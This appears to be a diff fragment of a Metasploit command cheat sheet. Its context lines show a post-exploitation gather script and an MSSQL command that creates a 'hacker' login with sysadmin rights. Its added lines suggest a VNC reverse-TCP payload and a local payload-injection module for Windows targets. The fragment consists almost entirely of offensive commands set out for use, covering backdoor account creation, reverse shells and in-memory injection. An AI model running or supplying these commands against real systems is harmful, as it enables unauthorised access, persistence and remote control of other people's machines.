@@ -452,3 +452,10 @@ set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/
 
 auxiliary(mssql_sql) > set sql EXEC sp_addlogin hacker, password;EXEC master.dbo.sp_addsrvrolemember hacker, sysadmin;  —priv
 run
+==========
+
+getgui will not work on Windows 2000 Server. Instead try:
+set PAYLOAD windows/vncinject/reverse_tcp
+
+For injecting into memory:
+use exploit/windows/local/payload_inject
